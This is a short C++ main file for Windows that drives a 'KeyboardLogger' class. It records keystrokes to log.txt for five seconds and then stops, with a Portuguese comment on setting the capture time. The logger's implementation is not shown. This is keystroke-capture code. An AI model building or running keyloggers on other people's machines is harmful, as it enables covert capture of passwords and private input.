#include "KeyboardLogger.h"
#include <synchapi.h>

int main() {
    KeyboardLogger logger("log.txt");
    logger.startLogging();
    
    //definir tempo da captura
    Sleep(5000);

    logger.stopLogging();
    return 0;
}
